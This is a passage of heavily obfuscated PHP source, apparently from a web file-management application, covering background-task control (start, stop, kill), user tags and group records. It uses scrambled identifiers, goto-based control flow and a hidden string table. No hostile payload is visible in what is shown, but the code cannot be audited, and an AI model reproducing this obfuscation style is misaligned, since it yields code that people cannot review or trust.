$aæ—¾åÑĞ = Hook::apply($c˜àƒÂêÇØ[$b‘ŸòÑª¢î[1549]]); default: break; } goto cİÖİÒ°˜; aÈ§ñŒÀò: return !0; goto EÃÒ…¹¶‰«; cİÖİÒ°˜: Model($b‘ŸòÑª¢î[1550])->add(array($b‘ŸòÑª¢î[1551] => $b‘ŸòÑª¢î[33], $b‘ŸòÑª¢î[1552] => $b‘ŸòÑª¢î[191], $b‘ŸòÑª¢î[29] => $b‘ŸòÑª¢î[1553] . $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[395]], $b‘ŸòÑª¢î[1554] => json_encode(array($b‘ŸòÑª¢î[28] => $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[28]], $b‘ŸòÑª¢î[1555] => timeFloat() - $fØŒ§İÍ£ù, $b‘ŸòÑª¢î[291] => $aæ—¾åÑĞ)))); $fë©Å”Ìóª = $aæ—¾åÑĞ ? $b‘ŸòÑª¢î[1556] . $aæ—¾åÑĞ : $b‘ŸòÑª¢î[33]; self::log($b‘ŸòÑª¢î[1557] . $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[395]] . $b‘ŸòÑª¢î[531] . $fë©Å”Ìóª); goto aÈ§ñŒÀò; D£‰›ÉØ÷š: $b‘ŸòÑª¢î =& $_SERVER[Ö‘Øù]; self::log($b‘ŸòÑª¢î[1546] . $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[395]] . $b‘ŸòÑª¢î[1547] . $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[28]] . $b‘ŸòÑª¢î[1548] . $c˜àƒÂêÇØ[$b‘ŸòÑª¢î[1549]]); Model($b‘ŸòÑª¢î[1530])->run($c˜àƒÂêÇØ[$b‘ŸòÑª¢î[395]]); goto Aø²¦È…ò¡; EÃÒ…¹¶‰«: } private static function valueGet($A¾ôˆõ‰Õ¾) { $dóµé°É£· =& $_SERVER[Ö‘Øù]; $E¥®¯¿ˆ•— = $dóµé°É£·[1558]; $Dµ˜Ê×‹„ = Model($dóµé°É£·[427])->get($A¾ôˆõ‰Õ¾, $E¥®¯¿ˆ•—); if (is_null($Dµ˜Ê×‹„)) { Model($dóµé°É£·[427])->set($dóµé°É£·[743], $dóµé°É£·[87], $E¥®¯¿ˆ•—); Model($dóµé°É£·[427])->set($dóµé°É£·[1524], $dóµé°É£·[191], $E¥®¯¿ˆ•—); $Dµ˜Ê×‹„ = Model($dóµé°É£·[427])->get($A¾ôˆõ‰Õ¾, $E¥®¯¿ˆ•—); } return $Dµ˜Ê×‹„; } private static function valueSet($cÅ³®¤ª½, $FÀÑĞÃ›Œ) { $d²™Š›ù… =& $_SERVER[Ö‘Øù]; $B¤¢˜¹”³í = $d²™Š›ù…[1559]; CacheLock::lock($B¤¢˜¹”³í); $e¾ñçâ¼åÓ = Model($d²™Š›ù…[427])->set($cÅ³®¤ª½, $FÀÑĞÃ›Œ, $d²™Š›ù…[1558]); CacheLock::unlock($B¤¢˜¹”³í); return $e¾ñçâ¼åÓ; } protected static function log($Dø¸‘µÜÎ’) { write_log($Dø¸‘µÜÎ’, $_SERVER[Ö‘Øù][1545]); } private static function cacheClear() { $CêËÖêà¸ =& $_SERVER[Ö‘Øù]; Cache::clearMemory(Model($CêËÖêà¸[427])->cacheKey($CêËÖêà¸[1558])); Cache::clearMemory(Model($CêËÖêà¸[427])->cacheKey($CêËÖêà¸[1560])); Model($CêËÖêà¸[1530])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\156\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($fĞˆ¤ÜùïÔ, $F¸¤çˆ³£İ = '', $eä›†ÎÙß¸ = 0, $CÅñáßÖ© = '') { goto eÊîœŸ¿Éò; CòœÓã”ì: $this->startAfter(); Hook::trigger($CÃŞ†£¯êØ[1571], $this->task); $this->task[$CÃŞ†£¯êØ[1564]] = timeFloat(); goto b™ÏòÒä§; eÊîœŸ¿Éò: $CÃŞ†£¯êØ =& $_SERVER[Ö‘Øù]; if (self::get($fĞˆ¤ÜùïÔ)) { return; } $this->task = array($CÃŞ†£¯êØ[395] => $fĞˆ¤ÜùïÔ, $CÃŞ†£¯êØ[1561] => USER_ID, $CÃŞ†£¯êØ[1464] => $CÅñáßÖ©, $CÃŞ†£¯êØ[29] => $F¸¤çˆ³£İ, $CÃŞ†£¯êØ[1058] => $CÃŞ†£¯êØ[33], $CÃŞ†£¯êØ[1056] => $eä›†ÎÙß¸, $CÃŞ†£¯êØ[1070] => 0, $CÃŞ†£¯êØ[1562] => 0, $CÃŞ†£¯êØ[1563] => 0, $CÃŞ†£¯êØ[782] => timeFloat(), $CÃŞ†£¯êØ[781] => 0, $CÃŞ†£¯êØ[1564] => 0, $CÃŞ†£¯êØ[1565] => 0, $CÃŞ†£¯êØ[1566] => 0, $CÃŞ†£¯êØ[743] => $CÃŞ†£¯êØ[1524]); goto aª¨ä»ê; aª¨ä»ê: $GLOBALS[$CÃŞ†£¯êØ[1567]] = 1; Hook::bind($CÃŞ†£¯êØ[1526], array($this, $CÃŞ†£¯êØ[1568])); Hook::bind($CÃŞ†£¯êØ[1569], array($this, $CÃŞ†£¯êØ[1570])); goto CòœÓã”ì; b™ÏòÒä§: } public function end() { goto A»½ªöÏ; eÓÀ¸ó: Hook::unbind($cìÖŞ‡›É‡[1569], array($this, $cìÖŞ‡›É‡[1570])); $this->endAfter(); $this->task = !1; goto fÅ½‰‰ÚÔ; A»½ªöÏ: $cìÖŞ‡›É‡ =& $_SERVER[Ö‘Øù]; if (!$this->task) { return; } if ($this->task[$cìÖŞ‡›É‡[1564]]) { self::valueSet($this->task[$cìÖŞ‡›É‡[395]], !1); } goto dÂŞ¹ªßÁ¯; dÂŞ¹ªßÁ¯: $eÉá£Ø—« = timeFloat() - $this->task[$cìÖŞ‡›É‡[782]]; self::log($cìÖŞ‡›É‡[1572] . $this->task[$cìÖŞ‡›É‡[395]] . $cìÖŞ‡›É‡[1573] . $eÉá£Ø—« . $cìÖŞ‡›É‡[1574]); Hook::unbind($cìÖŞ‡›É‡[1526], array($this, $cìÖŞ‡›É‡[1568])); goto eÓÀ¸ó; fÅ½‰‰ÚÔ: } public function update($a¾ôÜ¹÷ = 0, $Bà´¾¹¬– = false) { goto Aé¯‡Æ×Âë; aÑ‰çÂ–×¿: $FÜá«„™À[$e©· Ô½ÖÓ[1070]] += $a¾ôÜ¹÷; $FÜá«„™À[$e©· Ô½ÖÓ[781]] = timeFloat(); if ($FÜá«„™À[$e©· Ô½ÖÓ[1056]]) { if ($FÜá«„™À[$e©· Ô½ÖÓ[1056]] < $FÜá«„™À[$e©· Ô½ÖÓ[1070]]) { $FÜá«„™À[$e©· Ô½ÖÓ[1056]] = $FÜá«„™À[$e©· Ô½ÖÓ[1070]]; } $FëåÈù¯î‡ = timeFloat() - $FÜá«„™À[$e©· Ô½ÖÓ[782]] - $FÜá«„™À[$e©· Ô½ÖÓ[1565]]; $FÜá«„™À[$e©· Ô½ÖÓ[1562]] = $FÜá«„™À[$e©· Ô½ÖÓ[1070]] / $FÜá«„™À[$e©· Ô½ÖÓ[1056]]; $FÜá«„™À[$e©· Ô½ÖÓ[1563]] = $FÜá«„™À[$e©· Ô½ÖÓ[1070]] / $FëåÈù¯î‡; if ($FÜá«„™À[$e©· Ô½ÖÓ[1562]] > 0) { $FÜá«„™À[$e©· Ô½ÖÓ[1566]] = $FëåÈù¯î‡ * (1 - $FÜá«„™À[$e©· Ô½ÖÓ[1562]]) / $FÜá«„™À[$e©· Ô½ÖÓ[1562]]; } $FÜá«„™À[$e©· Ô½ÖÓ[1566]] = $FÜá«„™À[$e©· Ô½ÖÓ[1566]] <= 0 ? 0 : $FÜá«„™À[$e©· Ô½ÖÓ[1566]]; } goto EÎäÏ¶–®ğ; Aé¯‡Æ×Âë: $e©· Ô½ÖÓ =& $_SERVER[Ö‘Øù]; $FÜá«„™À =& $this->task; if (!$FÜá«„™À) { return; } goto aÑ‰çÂ–×¿; E¶“Çù˜: $C•Ô†Š¯ù = self::get($FÜá«„™À[$e©· Ô½ÖÓ[395]]); $C öÇÜøÛÈ = $C•Ô†Š¯ù[$e©· Ô½ÖÓ[743]]; if ($C öÇÜøÛÈ == self::STATYS_KILL) { $C½·‡Ğ¶ò = array($e©· Ô½ÖÓ[1575] => LNG($e©· Ô½ÖÓ[1576]), $e©· Ô½ÖÓ[1120] => !1); Cache::set($e©· Ô½ÖÓ[1577] . $this->task[$e©· Ô½ÖÓ[395]], $C½·‡Ğ¶ò, 30); $this->onKill(); $this->end(); die; } else { if ($C öÇÜøÛÈ == self::STATYS_STOP) { $D„ÛÎ‘ö© = 2; $C•Ô†Š¯ù[$e©· Ô½ÖÓ[1565]] += $D„ÛÎ‘ö©; self::valueSet($FÜá«„™À[$e©· Ô½ÖÓ[395]], $C•Ô†Š¯ù); sleep($D„ÛÎ‘ö©); $this->update(); return; } } goto F‰›²­Ç; EÎäÏ¶–®ğ: $this->updateAfter(); $D÷Ç¹²åñí = 0.2; if (timeFloat() - $FÜá«„™À[$e©· Ô½ÖÓ[1564]] < $D÷Ç¹²åñí && !$Bà´¾¹¬–) { return; } goto E¶“Çù˜; F‰›²­Ç: $FÜá«„™À[$e©· Ô½ÖÓ[743]] = $C öÇÜøÛÈ ? $C öÇÜøÛÈ : $FÜá«„™À[$e©· Ô½ÖÓ[743]]; $FÜá«„™À[$e©· Ô½ÖÓ[1565]] = $C•Ô†Š¯ù[$e©· Ô½ÖÓ[1565]] ? $C•Ô†Š¯ù[$e©· Ô½ÖÓ[1565]] : 0; $FÜá«„™À[$e©· Ô½ÖÓ[1564]] = timeFloat(); goto C®×‹ï³Ó; C®×‹ï³Ó: Hook::trigger($e©· Ô½ÖÓ[1578], $FÜá«„™À); self::valueSet($FÜá«„™À[$e©· Ô½ÖÓ[395]], $FÜá«„™À); goto Cøï‰ˆ½Ä; Cøï‰ˆ½Ä: } public function onKillSet($AŒîİùµ¥„, $CŸ’§…†‚ = array()) { $this->onKillCall = array($AŒîİùµ¥„, $CŸ’§…†‚); } public function onKill() { $AÊ±ò†İ¼ =& $_SERVER[Ö‘Øù]; self::log($AÊ±ò†İ¼[1572] . $this->task[$AÊ±ò†İ¼[395]] . $AÊ±ò†İ¼[1579]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($D¶Ç‘‚œÖø) { $Dè‡ë×ï•¾ =& $_SERVER[Ö‘Øù]; Cache::set($Dè‡ë×ï•¾[1577] . $this->task[$Dè‡ë×ï•¾[395]], $D¶Ç‘‚œÖø, 60); return $D¶Ç‘‚œÖø; } public static function get($CİÓÅŸºöÜ) { $f…¸ÌÜº˜Â =& $_SERVER[Ö‘Øù]; $CØæŠ†·ˆå = self::valueGet($CİÓÅŸºöÜ); if (is_array($CØæŠ†·ˆå) && $CØæŠ†·ˆå[$f…¸ÌÜº˜Â[1580]]) { $aíãÁŠÉÍò = ActionApply($CØæŠ†·ˆå[$f…¸ÌÜº˜Â[1580]], array($CØæŠ†·ˆå)); $CØæŠ†·ˆå = is_array($aíãÁŠÉÍò) ? $aíãÁŠÉÍò : $CØæŠ†·ˆå; } return $CØæŠ†·ˆå; } public static function listData() { $añ‰°óë¿¼ = self::valueGet(); return array_sort_by($añ‰°óë¿¼, $_SERVER[Ö‘Øù][782], !0); } public static function kill($A‰†Ó —ÇÜ) { return self::changeStatus($A‰†Ó —ÇÜ, self::STATYS_KILL); } public static function stop($Då°¨ä½—™) { return self::changeStatus($Då°¨ä½—™, self::STATYS_STOP); } public static function restart($fÁÉÂàÅ—Ù) { return self::changeStatus($fÁÉÂàÅ—Ù, self::STATYS_RUNNING); } public static function killAll() { $b§ºÅàÙƒå =& $_SERVER[Ö‘Øù]; $C†Ç¨Çè¼ = self::listData(); foreach ($C†Ç¨Çè¼ as $C…î¾­ôøù) { self::kill($C…î¾­ôøù[$b§ºÅàÙƒå[395]]); } sleep(2); foreach ($C†Ç¨Çè¼ as $C…î¾­ôøù) { self::valueSet($C…î¾­ôøù[$b§ºÅàÙƒå[395]], !1); } } private static function changeStatus($C¶ÜƒÔ…ÁÚ, $C®áòÓÊÂ) { goto a×ä¶‰×ò; a×ä¶‰×ò: $c§ñÖ’ÂÂ† =& $_SERVER[Ö‘Øù]; $E™ãÅ«ØÜ¯ = self::valueGet($C¶ÜƒÔ…ÁÚ); if (!$E™ãÅ«ØÜ¯) { return !1; } goto DØµ†ò÷Ÿß; DâÄ¶–•À: return !0; goto B´‡šğù¿; DØµ†ò÷Ÿß: $E™ãÅ«ØÜ¯[$c§ñÖ’ÂÂ†[743]] = $C®áòÓÊÂ; self::valueSet($C¶ÜƒÔ…ÁÚ, $E™ãÅ«ØÜ¯); self::log($c§ñÖ’ÂÂ†[1581] . $E™ãÅ«ØÜ¯[$c§ñÖ’ÂÂ†[395]] . $c§ñÖ’ÂÂ†[1582] . $C®áòÓÊÂ); goto DâÄ¶–•À; B´‡šğù¿: } public static function valueGet($Bí– ´‰Êö = false) { $F½¬´…ùÉ² =& $_SERVER[Ö‘Øù]; if ($Bí– ´‰Êö) { $d°  À³Ûö = Model($F½¬´…ùÉ²[440])->where(array($F½¬´…ùÉ²[93] => $Bí– ´‰Êö, $F½¬´…ùÉ²[29] => $F½¬´…ùÉ²[1583]))->find(); return $d°  À³Ûö ? json_decode($d°  À³Ûö[$F½¬´…ùÉ²[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eÎ íµñ¨¼ = false) { goto dé‹›«Ğ¯¿; DƒòÚİ…¤¨: return $CÉîá Äˆ; goto FµŸÃòö¦Ù; dé‹›«Ğ¯¿: $F‰„Îô“‹± =& $_SERVER[Ö‘Øù]; $e®ì”Î¯Óî = array($F‰„Îô“‹±[29] => $F‰„Îô“‹±[1583]); if ($eÎ íµñ¨¼) { $e®ì”Î¯Óî[$F‰„Îô“‹±[1561]] = $eÎ íµñ¨¼; } goto D§«ªóóáğ; D§«ªóóáğ: $CÉîá Äˆ = Model($F‰„Îô“‹±[440])->where($e®ì”Î¯Óî)->select(); $CÉîá Äˆ = $CÉîá Äˆ ? $CÉîá Äˆ : array(); foreach ($CÉîá Äˆ as $BÑ‘¤Æ±ö¿ => $F¨³Û¾áÍ) { $CÉîá Äˆ[$BÑ‘¤Æ±ö¿] = json_decode($F¨³Û¾áÍ[$F‰„Îô“‹±[372]], !0); } goto DƒòÚİ…¤¨; FµŸÃòö¦Ù: } public static function valueSet($aâì¶ÚÔÛÆ, $f±›ä´íÎ) { goto f®†Ó‹†øè; A¥Ÿ‡Âó“: $cªÛ³³ãòÍ = $bÁ·Û¯ÇÛ³[1585]; CacheLock::lock($cªÛ³³ãòÍ); Model($bÁ·Û¯ÇÛ³[440])->add($bö‚óøöğ, array(), !0); goto bÎ¥µğ„ÆÍ; f®†Ó‹†øè: $bÁ·Û¯ÇÛ³ =& $_SERVER[Ö‘Øù]; if (!$f±›ä´íÎ) { return Model($bÁ·Û¯ÇÛ³[440])->where(array($bÁ·Û¯ÇÛ³[93] => $aâì¶ÚÔÛÆ, $bÁ·Û¯ÇÛ³[29] => $bÁ·Û¯ÇÛ³[1583]))->delete(); } $dì™ª÷´ç© = json_encode($f±›ä´íÎ); goto E–ó­ƒùÅµ; E–ó­ƒùÅµ: if (!$dì™ª÷´ç©) { ob_start(); var_dump($f±›ä´íÎ); $d°—â«ê = ob_get_clean(); self::log($bÁ·Û¯ÇÛ³[1584] . json_encode_force($d°—â«ê)); } if (!$aâì¶ÚÔÛÆ || !$f±›ä´íÎ[$bÁ·Û¯ÇÛ³[395]]) { return !1; } $bö‚óøöğ = array($bÁ·Û¯ÇÛ³[29] => $bÁ·Û¯ÇÛ³[1583], $bÁ·Û¯ÇÛ³[1561] => USER_ID, $bÁ·Û¯ÇÛ³[93] => $aâì¶ÚÔÛÆ, $bÁ·Û¯ÇÛ³[372] => $dì™ª÷´ç©); goto A¥Ÿ‡Âó“; bÎ¥µğ„ÆÍ: CacheLock::unlock($cªÛ³³ãòÍ); goto BÇ•Ûß‹‰; BÇ•Ûß‹‰: } public static function log($a£‡é„Û—Æ) { if (!GLOBAL_DEBUG) { return; } write_log($a£‡é„Û—Æ, $_SERVER[Ö‘Øù][1586]); } } goto F£çêÀÊ”â; C„¾æ µ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\x55\163\145\x72\117\x70\x74\151\157\x6e"; public $field = array("\156\141\x6d\145", "\x73\x74\x79\154\145", "\x73\157\x72\x74"); public function listData($cç×ã†ñ = false, $E™¸šö¼­è = "\163\x6f\x72\x74", $Bá¼áœìô¼ = false) { return parent::listData($cç×ã†ñ, $E™¸šö¼­è, $Bá¼áœìô¼); } public function remove($FÉ†Ö°Ò—™) { return parent::remove($FÉ†Ö°Ò—™); } public function add($aù¬‡·ÌÙ‰, $cÉ¤äÇ¥™Û = "\154\x61\142\145\154\55\x67\162\145\x79\55\156\157\162\x6d\x61\x6c") { $bÛ«ÌáÕ’ =& $_SERVER[Ö‘Øù]; if ($this->findByName($aù¬‡·ÌÙ‰)) { return !1; } $Bïô•Î = array($bÛ«ÌáÕ’[415] => $aù¬‡·ÌÙ‰, $bÛ«ÌáÕ’[479] => $cÉ¤äÇ¥™Û, $bÛ«ÌáÕ’[1734] => $this->getSort($bÛ«ÌáÕ’[256]) + 1); return parent::insert($Bïô•Î); } public function update($aêšù‹èé, $b™˜ºæ‚ğ‡) { $AÖª¦íÛƒè =& $_SERVER[Ö‘Øù]; $DÜ…ËÛƒÕ = $this->listData($aêšù‹èé); $AµËô¾¬Â‰ = $this->findByName($b™˜ºæ‚ğ‡[$AÖª¦íÛƒè[28]]); if (!$DÜ…ËÛƒÕ || $AµËô¾¬Â‰ && $AµËô¾¬Â‰[$AÖª¦íÛƒè[395]] != $DÜ…ËÛƒÕ[$AÖª¦íÛƒè[395]]) { return !1; } return parent::update($aêšù‹èé, $b™˜ºæ‚ğ‡); } public function moveTop($dêöÑ«áäÀ) { $BóÒ¿è‘¡ =& $_SERVER[Ö‘Øù]; $BŠÛ³ÍÂÛ = parent::listData(); $eÛÖÖ†—Ã° = $this->getSort($BóÒ¿è‘¡[255]); foreach ($BŠÛ³ÍÂÛ as &$a†Ó¤Úíë) { if ($a†Ó¤Úíë[$BóÒ¿è‘¡[395]] == $dêöÑ«áäÀ) { $a†Ó¤Úíë[$BóÒ¿è‘¡[1753]] = $eÛÖÖ†—Ã°; continue; } $a†Ó¤Úíë[$BóÒ¿è‘¡[1753]] += 1; } unset($a†Ó¤Úíë); return parent::resetData($BŠÛ³ÍÂÛ); } public function moveBottom($D´Àì¨Áí¡) { $fìÊŠÁì¦ç =& $_SERVER[Ö‘Øù]; $cÅˆ£õ¥ô¢ = $this->getSort($fìÊŠÁì¦ç[256]) + 1; return parent::update($D´Àì¨Áí¡, array($fìÊŠÁì¦ç[1753] => $cÅˆ£õ¥ô¢)); } public function resetSort($b˜…Ÿè¼») { goto BèñŠ‘ä¹‰; BèñŠ‘ä¹‰: $E“•›ÉØğ =& $_SERVER[Ö‘Øù]; $fæàØù´Å¿ = array(); $b˜…Ÿè¼» = is_array($b˜…Ÿè¼») ? $b˜…Ÿè¼» : array(); goto EÈ¸±„´©; Dğ†âŸ°­÷: unset($CŠ¬æÃ¤ïö); return parent::resetData($a•Ó…îåÊ); goto E»ŞÎ„´; EÈ¸±„´©: for ($e‘”¥àˆÃë = 0; $e‘”¥àˆÃë < count($b˜…Ÿè¼»); $e‘”¥àˆÃë++) { $fæàØù´Å¿[$b˜…Ÿè¼»[$e‘”¥àˆÃë] . $E“•›ÉØğ[33]] = $e‘”¥àˆÃë + 1; } $a•Ó…îåÊ = parent::listData(); foreach ($a•Ó…îåÊ as &$CŠ¬æÃ¤ïö) { $D…Ù¨íó°Ë = $fæàØù´Å¿[$CŠ¬æÃ¤ïö[$E“•›ÉØğ[395]]]; $CŠ¬æÃ¤ïö[$E“•›ÉØğ[1753]] = $D…Ù¨íó°Ë ? $D…Ù¨íó°Ë : $CŠ¬æÃ¤ïö[$E“•›ÉØğ[1753]]; } goto Dğ†âŸ°­÷; E»ŞÎ„´: } private function getSort($Cƒøª“Î§ç) { $Fò‘©¸Á‡÷ =& $_SERVER[Ö‘Øù]; $E¥›Ó·ÜŠ˜ = parent::listData(); $bªŞ¯‘ÃğØ = array_to_keyvalue($E¥›Ó·ÜŠ˜, $Fò‘©¸Á‡÷[33], $Fò‘©¸Á‡÷[1753]); if (!$bªŞ¯‘ÃğØ) { $bªŞ¯‘ÃğØ = array(0); } $DœóöÏµÀ = $Cƒøª“Î§ç == $Fò‘©¸Á‡÷[256] ? max($bªŞ¯‘ÃğØ) : min($bªŞ¯‘ÃğØ); return intval($DœóöÏµÀ); } } goto cà§÷ßµÉ¿; Còá±¥º: define($_SERVER[Ö‘Øù][237], 2); define($_SERVER[Ö‘Øù][238], 3); define($_SERVER[Ö‘Øù][239], 1); goto F…—Ÿ—ó; b—˜¤¢ÁÏ‘: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\155\x65" => "\x67\162\x6f\x75\x70\x5f\x6d\x65\164\x61", "\x6d\x65\x74\141\x46\151\x65\x6c\144" => "\147\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($Fõ›Ø §ŸŒ) { $dÃ‰ŸÖßÆ =& $_SERVER[Ö‘Øù]; return array($dÃ‰ŸÖßÆ[1804] => array($Fõ›Ø §ŸŒ[0], $dÃ‰ŸÖßÆ[1805]), $dÃ‰ŸÖßÆ[1806] => array($Fõ›Ø §ŸŒ[0], $dÃ‰ŸÖßÆ[1807])); } protected function getInfo($dÂÂÍ¼Å„, $c¦„¹µî = false) { $D¯‹ğåëÁä = $this->getInfoSimple($dÂÂÍ¼Å„); if (!$D¯‹ğåëÁä) { return !1; } if ($c¦„¹µî) { return $this->_listDataApplyItem($D¯‹ğåëÁä); } return $this->cacheFunctionGet($_SERVER[Ö‘Øù][1808], $dÂÂÍ¼Å„); } protected function getInfoSimple($D«Øš›«×„, $DõéŠÇù‡Ÿ = false) { $eŠÖÓ‚ÓŠæ =& $_SERVER[Ö‘Øù]; if ($DõéŠÇù‡Ÿ) { $F«çŠñöô = array($eŠÖÓ‚ÓŠæ[1730] => intval($D«Øš›«×„)); $F·–Ğ–Ñ = $this->where($F«çŠñöô)->find(); return is_array($F·–Ğ–Ñ) ? $F·–Ğ–Ñ : array(); } return $this->cacheFunctionGet($eŠÖÓ‚ÓŠæ[1809], $D«Øš›«×„); } protected function groupAdd($dä«ñ‚¹·Ú) { goto fåëÆ¢å‡; F›†“ì¸¦„: if (isset($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1812]])) { $this->metaSet($Bš Ë“ÜÔê, array($C‰ò£µÅÔÑ[1812] => $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1812]], $C‰ò£µÅÔÑ[1813] => $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1813]])); unset($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1812]]); unset($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1813]]); } Model($C‰ò£µÅÔÑ[1240])->groupRootAdd($Bš Ë“ÜÔê); return $Bš Ë“ÜÔê; goto bµ‰’¶¸Ÿ; fƒö‰¬Ç£: if ($dåäÍİÚÖ‡[$C‰ò£µÅÔÑ[516]]) { $B“×è‚¼ŠÛ = $dåäÍİÚÖ‡[$C‰ò£µÅÔÑ[516]] . $dåäÍİÚÖ‡[$C‰ò£µÅÔÑ[1730]] . $C‰ò£µÅÔÑ[47]; } $a×š‚Ê¡ŸŠ = array($C‰ò£µÅÔÑ[415] => $this->groupNameAuto($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[493]], $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[28]]), $C‰ò£µÅÔÑ[396] => $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[493]], $C‰ò£µÅÔÑ[579] => $B“×è‚¼ŠÛ, $C‰ò£µÅÔÑ[1810] => $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1714]], $C‰ò£µÅÔÑ[1811] => 0, $C‰ò£µÅÔÑ[1734] => 0); if (isset($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1753]])) { $a×š‚Ê¡ŸŠ[$C‰ò£µÅÔÑ[1753]] = $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1753]]; } else { $AÚ×ÌëÁ = $this->max($C‰ò£µÅÔÑ[1753]); if (!$AÚ×ÌëÁ) { $AÚ×ÌëÁ = 0; } $a×š‚Ê¡ŸŠ[$C‰ò£µÅÔÑ[1753]] = $AÚ×ÌëÁ + 1; } goto B•„ğÊ’èí; fåëÆ¢å‡: $C‰ò£µÅÔÑ =& $_SERVER[Ö‘Øù]; if (!$dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[493]] && isset($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]]) && $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]] == 1) { if ($dåäÍİÚÖ‡ = $this->getInfoSimple($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]], !0)) { return $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]]; } } else { $dåäÍİÚÖ‡ = $this->getInfoSimple($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[493]]); if (!$dåäÍİÚÖ‡) { return !1; } } $B“×è‚¼ŠÛ = $C‰ò£µÅÔÑ[526]; goto fƒö‰¬Ç£; B•„ğÊ’èí: if (!empty($dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]])) { $a×š‚Ê¡ŸŠ[$C‰ò£µÅÔÑ[1730]] = $dä«ñ‚¹·Ú[$C‰ò£µÅÔÑ[1730]]; } $Bš Ë“ÜÔê = $this->add($a×š‚Ê¡ŸŠ); $this->setNamePinyin($Bš Ë“ÜÔê, $a×š‚Ê¡ŸŠ[$C‰ò£µÅÔÑ[28]]); goto F›†“ì¸¦„; bµ‰’¶¸Ÿ: } protected function groupEdit($aèÄŞø„±¹, $a‰ÍçŸŞ”) { goto DÜÙº­–ÀÑ; dÂ‚½ŒÌÓ´: $this->_clearChildrenCache($fÁÌ–÷£Ü); return $this->where(array($FÅ²À„Æè°[1814] => $aèÄŞø„±¹))->save($a‰ÍçŸŞ”); goto f±‰ì–À©; DÜÙº­–ÀÑ: $FÅ²À„Æè° =& $_SERVER[Ö‘Øù]; $fÁÌ–÷£Ü = $this->getInfoSimple($aèÄŞø„±¹); if (!$fÁÌ–÷£Ü) { return !1; } goto cÍ†ÒÏå­; cÍ†ÒÏå­: if (!empty($a‰ÍçŸŞ”[$FÅ²À„Æè°[493]])) { $FÕ¡„¡Ó = $this->getInfoSimple($a‰ÍçŸŞ”[$FÅ²À„Æè°[493]]); if (!$FÕ¡„¡Ó) { return !1; } if ($fÁÌ–÷£Ü[$FÅ²À„Æè°[1730]] == $FÕ¡„¡Ó[$FÅ²À„Æè°[1730]]) { return !1; } if ($a‰ÍçŸŞ”[$FÅ²À„Æè°[493]] != $fÁÌ–÷£Ü[$FÅ²À„Æè°[493]]) { if ($FÕ¡„¡Ó[$FÅ²À„Æè°[516]] !== $fÁÌ–÷£Ü[$FÅ²À„Æè°[516]] && strpos($FÕ¡„¡Ó[$FÅ²À„Æè°[516]], $fÁÌ–÷£Ü[$FÅ²À„Æè°[516]] . $fÁÌ–÷£Ü[$FÅ²À„Æè°[1730]] . $FÅ²À„Æè°[47]) === 0) { return !1; } $a‰ÍçŸŞ”[$FÅ²À„Æè°[579]] = $FÕ¡„¡Ó[$FÅ²À„Æè°[516]] . $a‰ÍçŸŞ”[$FÅ²À„Æè°[493]] . $FÅ²À„Æè°[47]; $this->_changeChildLevel($fÁÌ–÷£Ü, $FÕ¡„¡Ó); } } if (isset($a‰ÍçŸŞ”[$FÅ²À„Æè°[28]])) { $this->setNamePinyin($aèÄŞø„±¹, $a‰ÍçŸŞ”[$FÅ²À„Æè°[28]]); } if (isset($a‰ÍçŸŞ”[$FÅ²À„Æè°[1812]])) { $this->metaSet($aèÄŞø„±¹, array($FÅ²À„Æè°[1812] => $a‰ÍçŸŞ”[$FÅ²À„Æè°[1812]], $FÅ²À„Æè°[1813] => $a‰ÍçŸŞ”[$FÅ²À„Æè°[1813]])); unset($a‰ÍçŸŞ”[$FÅ²À„Æè°[1812]]); unset($a‰ÍçŸŞ”[$FÅ²À„Æè°[1813]]); } goto dÂ‚½ŒÌÓ´; f±‰ì–À©: } private function _clearChildrenCache($dğââô†›Ö) { $fÙÃã¤Ä´ =& $_SERVER[Ö‘Øù]; $b—×ÆÜíù‰ = array($fÙÃã¤Ä´[579] => array($fÙÃã¤Ä´[539], $dğââô†›Ö[$fÙÃã¤Ä´[516]] . $dğââô†›Ö[$fÙÃã¤Ä´[1730]] . $fÙÃã¤Ä´[540])); $B”Ëµ§óˆ = $this->field($fÙÃã¤Ä´[1730])->where($b—×ÆÜíù‰)->select(); foreach ($B”Ëµ§óˆ as $EÅ„›ïÍÅ ) { $this->_clearCache($EÅ„›ïÍÅ [$fÙÃã¤Ä´[1730]]); } } private function _clearCache($DÑñÕÈÊÓÈ) { $b¥ñÁ‡¿‡ =& $_SERVER[Ö‘Øù]; 